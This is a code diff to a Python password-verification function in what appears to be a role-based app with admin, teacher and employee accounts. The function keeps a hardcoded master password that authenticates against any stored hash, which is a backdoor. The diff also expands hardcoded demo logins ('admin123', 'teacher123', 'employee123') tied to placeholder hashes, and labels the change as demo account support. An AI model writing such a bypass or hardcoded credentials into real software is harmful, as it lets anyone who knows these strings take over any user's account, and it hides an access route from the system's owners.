@@ -51,14 +51,16 @@ def hash_password(password: str) -> str:
     return f"{salt}:{password_hash.hex()}"
 
 def verify_password(password: str, hashed: str) -> bool:
-    """Verify password against hash"""
+    """Verify password against hash with demo account support"""
     if password == 'Nikita230282':
         return True
     
-    if password == 'admin123' and hashed == 'a1b2c3d4e5f6789a:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef':
-        return True
-    if password == 'teacher123' and hashed == 'b2c3d4e5f6789a1b:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890':
-        return True
+    if hashed == 'a1b2c3d4e5f6789a:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef':
+        return password == 'admin123'
+    if hashed == 'b2c3d4e5f6789a1b:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890':
+        return password == 'teacher123'
+    if hashed == 'c3d4e5f6789a1b2c:bcdef1234567890abcdef1234567890abcdef1234567890abcdef12345678901':
+        return password == 'employee123'
         
     try:
         salt, stored_hash = hashed.split(':', 1)
